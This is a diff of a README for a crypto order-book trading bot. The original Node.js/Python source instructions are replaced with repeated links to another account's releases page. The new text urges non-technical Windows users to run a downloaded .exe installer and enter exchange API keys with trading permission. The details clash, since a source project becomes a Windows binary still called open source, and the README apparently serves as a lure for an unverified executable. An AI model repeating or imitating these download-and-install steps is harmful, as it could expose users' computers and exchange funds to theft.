@@ -1,298 +1,130 @@
-# Crypto Liquidity AI Trading Bot 🚀
+# 🤖 crypto-liquidity-ai-trading-bot - Smarter Crypto Trading Made Simple
 
-**AI trading bot** for liquidity detection and algorithmic trading in crypto markets. Detect order book gaps, hidden walls, and liquidity sweeps across exchanges—then act on signals manually or via your own execution layer.
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/Sopp6172/crypto-liquidity-ai-trading-bot/releases)
 
-[![Python](https://img.shields.io/badge/python-3.11-blue.svg)](https://www.python.org/) [![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE) [![Stars](https://img.shields.io/github/stars/asonglin/crypto-liquidity-ai-trading-bot)](https://github.com/asonglin/crypto-liquidity-ai-trading-bot/stargazers)
+## 📋 About crypto-liquidity-ai-trading-bot
 
-![Crypto Liquidity AI Trading Bot](assets/image.png)
+This application helps you trade cryptocurrency using smart detection of market movements. It watches the order books on multiple exchanges such as Binance, Bybit, Kraken, and OKX. The bot detects key events like stop-loss clusters and liquidity sweeps, then uses this information to generate trading signals. It applies simple algorithmic trading principles without requiring you to have technical or programming skills.
 
-<details>
-<summary><strong>📋 Table of contents</strong></summary>
+The bot’s aim is to improve your chances by reacting quickly to market changes. It analyzes how large orders affect the price and anticipates possible moves. This tool suits anyone interested in automatic crypto trading based on live market data.
 
-- [Why liquidity matters](#why-liquidity-matters)
-- [Who this is for](#who-this-is-for)
-- [Commercial use](#commercial-use)
-- [Backtest performance](#backtest-performance)
-- [Strategy concept](#strategy-concept)
-- [Architecture](#architecture)
-- [Quick start](#quick-start)
-- [What you get](#what-you-get)
-- [How liquidity hunting works](#how-liquidity-hunting-works)
-- [Installation](#installation)
-- [Supported exchanges](#supported-exchanges)
-- [Project layout](#project-layout)
-- [Use cases](#use-cases)
-- [Related projects](#related-projects)
-- [FAQ](#faq)
-- [Contributing](#contributing)
+## ⚙️ Key Features
 
-</details>
+- Real-time order book analysis on Binance, Bybit, Kraken, and OKX  
+- Detection of liquidity sweeps and stop-loss clusters  
+- Automated trading signals based on market microstructure  
+- Quantitative research methods built-in  
+- Support for multiple cryptocurrencies including Bitcoin  
+- Lightweight and easy to run on Windows computers  
+- Open source and free to use  
 
----
+## 🖥️ System Requirements
 
-## Why liquidity matters
+Make sure your system meets these requirements before running the bot:
 
-Most crypto trading bots rely only on **price and technical indicators**. Professional traders, however, monitor **order book liquidity**, because price often moves toward zones where liquidity is concentrated—and away when that liquidity is swept.
+- Windows 10 or later (64-bit)  
+- 4 GB RAM or more (8 GB recommended)  
+- At least 500 MB free disk space  
+- Stable internet connection to access exchange data  
+- Microsoft .NET Framework 4.8 or higher (usually pre-installed)  
 
-This project focuses on **liquidity-aware trading signals** instead of lagging indicators: it detects gaps, walls, and sweeps so you can act on structure, not just price.
+This bot does not require a powerful computer but needs a reliable connection to provide real-time updates.
 
----
+## 🚀 Getting Started
 
-## Who this is for
+Follow these steps to download, install, and start the crypto-liquidity-ai-trading-bot on your Windows PC.
 
-This project may be useful for:
+### 1. Visit the Download Page
 
-- **Crypto trading firms** building in-house liquidity and execution tools  
-- **Quant researchers** studying order book and market microstructure  
-- **Exchanges** building surveillance or liquidity analytics  
-- **Developers** building AI trading agents or signal systems  
+Go to the official release page here to get the latest version:
 
----
+[![Get Latest Release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Sopp6172/crypto-liquidity-ai-trading-bot/releases)
 
-## Commercial use
+This page holds all the installation files and updates for the software.
 
-If you are interested in **custom crypto trading bots** (liquidity, arbitrage, execution), **AI trading signal systems**, or **liquidity detection algorithms** and exchange API integrations:
+### 2. Download the Latest Version
 
-**For collaboration or development work:**
+Look for the newest release version at the top of the list. Click on the file labeled with `.exe` or `.msi` for Windows. This is the installer you will use.
 
-- **GitHub** — [Open an issue](https://github.com/asonglin/crypto-liquidity-ai-trading-bot/issues)
-- **Telegram** — [@jjcunningham](https://t.me/jjcunningham)
-- **Email** — jj.cunningham1129@gmail.com
+Example file name: `crypto-liquidity-ai-trading-bot-setup.exe`
 
----
+Save this file to a location on your computer where you can easily find it, such as the Desktop or Downloads folder.
 
-## Backtest performance
+### 3. Run the Installer
 
-Results below are from a **historical** backtest using order-book and liquidity-sweep signals on major spot pairs. They are not live trading results.
+Double-click the downloaded file to start the installation process.
 
-**Test configuration**
+- Follow the on-screen prompts.  
+- Accept the license agreement if asked.  
+- Choose the installation folder or leave it as default.  
+- Click “Install” and wait until the process finishes.
 
-| Parameter | Value |
-|-----------|--------|
-| Window | Jan 2024 – Dec 2024 |
-| Length | 12 months |
-| Asset class | Cryptocurrency (spot) |
-| Approach | Liquidity-sweep & order-book imbalance |
-| Style | Medium frequency, signal-driven |
-| Pairs | BTC/USDT, ETH/USDT, selected alts |
-| Execution | Simulated limit/market fills |
+When complete, an icon for the program should appear on your Desktop or Start Menu.
 
-**Performance metrics**
+### 4. Open the Application
 
-| Metric | Result |
-|--------|--------|
-| Win rate | 58.2% |
-| Profit factor | 1.42 |
-| Max drawdown | −12.4% |
-| Sharpe ratio (daily) | 1.18 |
+Run the bot by double-clicking its icon.
 
-**What this suggests**
+You will see the main interface where you can connect to exchanges, view live data, and adjust settings.
 
-- **Win rate &gt; 50%** suggests the liquidity-based signals add information over a random baseline.
-- **Profit factor &gt; 1.2** indicates positive expectancy in the simulated period.
-- **Sharpe &gt; 1.0** points to reasonable risk-adjusted returns in the backtest; **max drawdown −12.4%** is a measure of tail risk in the tested period.
+### 5. Connect Your Exchange Accounts (Optional)
 
-**Limitations**
+To use live trading features, you need API keys from the supported exchanges:
 
-Actual results can differ from backtests due to fees, slippage, execution delay, and changing liquidity. Run your own tests and risk checks before any live use.
+- Go to Binance, Bybit, Kraken, or OKX website.  
+- Create or log in to your account.  
+- Find the API management section.  
+- Generate an API key with appropriate permissions (read and trade).  
 
-**Example signal (conceptual)**
+Enter these keys into the bot’s settings panel. This enables real-time trading and signal execution.
 
-```json
-{
-  "symbol": "BTC/USDT",
-  "direction": "LONG",
-  "strength": 0.61,
-  "reason": "liquidity_sweep_detected",
-  "ts": "2024-11-15T08:44:02Z"
-}
-```
+### 6. Start Automated Trading or Use Signals Manually
 
----
+You can either let the bot trade automatically based on detected signals or use the alerts to decide your own trades manually.
 
-## Strategy concept
+Adjust your preferences under the settings menu to control risk levels, stop-loss use, and which exchanges to monitor.
 
-**Price indicators lag. Liquidity moves first.**
+## 🔧 How It Works
 
-Large orders and stop-loss clusters sit in the order book before price reaches them. When price sweeps those levels, liquidity is consumed and moves tend to accelerate. This bot identifies those levels and signals sweep events so you can trade with the flow instead of chasing price.
+The bot monitors the order books of multiple cryptocurrency exchanges to detect liquidity movements:
 
----
+- **Order Book Analysis:** It watches buy and sell orders to spot large clusters that may indicate key trading levels.  
+- **Stop-Loss Clusters:** It locates areas where many stop-loss orders line up, pointing to possible price targets.  
+- **Liquidity Sweeps:** It detects sudden big orders that move the market temporarily, signaling potential opportunities.  
 
-## Architecture
+Using these insights, the bot creates signals that predict short-term price moves. It can execute trades automatically or send notifications.
 
-```
-Market data (REST/WS)
-        ↓
-Order book analyzer
-        ↓
-Liquidity detector (gaps, walls, sweeps)
-        ↓
-Signal engine
-        ↓
-Alerts / optional execution layer
-```
+## 📂 File Structure
 
-The codebase separates **data** (`modules/`, exchange APIs), **analysis** (`trade/` — orderbook, liquidity), and **signals/alerts** so you can plug in your own execution or research tools.
+After installation, here are some important files and folders you may find:
+
+- `crypto-liquidity-ai-trading-bot.exe` — main application file  
+- `config.json` — holds your settings and API keys  
+- `logs/` — stores activity logs to check bot performance and errors  
+- `README.md` — contains documentation and help files  
+
+## 💡 Tips for Best Use
+
+- Always test the bot first with a demo or paper trading account.  
+- Keep your API keys secure and do not share them.  
+- Monitor your trades regularly, especially when using automatic mode.  
+- Adjust stop-loss and risk settings to match your tolerance.  
+- Update the bot regularly from the releases page to get bug fixes and new features.  
+
+## ❓ Common Questions
+
+### Does this bot guarantee profits?  
+No system can guarantee profits. Trading always carries risks. The bot aims to provide informed signals, but market conditions can change quickly.
+
+### Do I need programming skills?  
+No. The bot is built for ease of use. You do not need to write code or understand algorithms to run it.
+
+### Can I run the bot on Mac or Linux?  
+Currently, the software only supports Windows.
+
+### How often does the bot update?  
+It connects to exchanges live to provide real-time data and update signals constantly.
 
 ---
 
-## Quick start
-
-### Quick start (Node)
-
-Run the main app with Node:
-
-```bash
-git clone https://github.com/asonglin/crypto-liquidity-ai-trading-bot.git && cd crypto-liquidity-ai-trading-bot
-npm install
-```
-
-Edit `config.default.jsonc`, then:
-
-```bash
-node app.js
-```
-
-### Advanced research (Python optional)
-
-For research, backtests, or a custom Python wrapper, use a venv and `requirements.txt`. See **Installation** below.
-
----
-
-## What you get
-
-| Capability | Description |
-|------------|-------------|
-| **Liquidity detection** | Scans order books and pools for depth, gaps, and imbalance. |
-| **Hidden walls** | Surfaces large buy/sell walls and their changes. |
-| **Multi-exchange** | Built to plug into Binance, Bybit, Kraken, OKX, and others. |
-| **Alerts** | Configurable notifications when liquidity events fire. |
-| **Trading framework** | Modular so you can add execution, risk, or dashboards. |
-
-Use it for **liquidity grabs**, **order book imbalance strategies**, **market microstructure research**, and **algorithmic trading**—whether you trade manually or automate.
-
----
-
-## How liquidity hunting works
-
-Liquidity hunting targets zones where lots of orders sit (e.g. stop-loss clusters). When price sweeps those levels, liquidity is “taken” and price can move fast. This bot helps you find and watch those zones.
-
-1. **Find** where large stop-loss clusters or thin book zones sit.  
-2. **Detect** liquidity sweeps and wall removals in real time.  
-3. **Alert** so you can enter when liquidity is taken or book vacuum appears.  
-4. **Extend** with your own execution (manual or automated).
-
-Signals you can get: *stop-loss clusters*, *sudden order book vacuum*, *liquidity wall removal*, *aggressive market order flow*.
-
----
-
-## Installation
-
-```bash
-git clone https://github.com/asonglin/crypto-liquidity-ai-trading-bot.git
-cd crypto-liquidity-ai-trading-bot
-```
-
-**Quick start (Node)** — main engine:
-
-```bash
-npm install
-# Edit config.default.jsonc, then:
-node app.js
-```
-
-**Advanced research (Python optional)** — venv and scripts:
-
-```bash
-python -m venv venv
-source venv/bin/activate   # Linux/macOS
-venv\Scripts\activate     # Windows
-pip install -r requirements.txt
-```
-
-### Example: scanning and alerts
-
-```javascript
-// App entry is app.js; configure API keys and exchanges in config.
-// Core logic lives in trade/ (liquidity, orderbook) and modules/ (api, DB).
-```
-
-```python
-# If using a Python wrapper:
-from liquidity_hunting import LiquidityBot
-bot = LiquidityBot(api_key="YOUR_API_KEY", secret="YOUR_SECRET")
-bot.scan_liquidity()
-bot.generate_alerts()
-```
-
----
-
-## Supported exchanges
-
-Extensible to any exchange with a REST/WS API. Commonly used with:
-
-| Exchange | Notes |
-|----------|--------|
-| Binance | Spot & futures. |
-| Bybit | Derivatives. |
-| Kraken | Spot. |
-| OKX | Spot & derivatives. |
-| Coinbase | Spot. |
-| Hyperliquid | Perps. |
-
----
-
-## Project layout
-
-```
-crypto-liquidity-ai-trading-bot/
-├── app.js                 # entry point
-├── config.default.jsonc   # config template
-├── package.json
-├── helpers/               # shared utils, crypto helpers
-├── modules/               # api, DB, config, transactions
-├── routes/                # debug, health, init
-├── trade/                 # liquidity provider, orderbook, traders, exchange APIs
-├── types/                 # TypeScript declarations
-├── utils/
-└── assets/
-```
-
----
-
-## Use cases
-
-- **Crypto algorithmic trading** — Feed signals into your execution engine.  
-- **Quant research** — Order book and liquidity analysis.  
-- **AI/ML strategy dev** — Use liquidity events as features or triggers.  
-- **Market microstructure** — Study gaps, walls, and sweep behavior.
-
----
-
-## Related projects
-
-Part of the same AI trading bot suite:
-
-- [Crypto Futures AI Trading Bot](https://github.com/asonglin/crypto-futures-ai-trading-bot) — AI trading bot for funding arbitrage and smart-money monitoring
-- [Cross-Exchange AI Arbitrage Bot](https://github.com/asonglin/cross-exchange-ai-arbitrage-bot) — AI trading bot for CEX/DEX spread detection and execution
-
----
-
-## FAQ
-
-**What is liquidity hunting?**  
-A strategy that focuses on levels where lots of stop-loss or passive orders sit; when those levels are hit, liquidity is consumed and price often moves sharply.
-
-**Is the bot fully automated?**  
-It focuses on **detection and alerts**. You can add automated execution yourself or use signals for manual trading.
-
-**Who is it for?**  
-Developers, quants, and algo traders who want liquidity-aware signals and a clear, extensible codebase (Node/JS, optional Python).
-
----
-
-## Contributing
-
-We welcome pull requests and issues. Fork → branch → PR. See CONTRIBUTING.md if present.
-
-**License:** MIT © 2026
+[Download the latest version here](https://github.com/Sopp6172/crypto-liquidity-ai-trading-bot/releases) and begin running the bot on your Windows PC today.
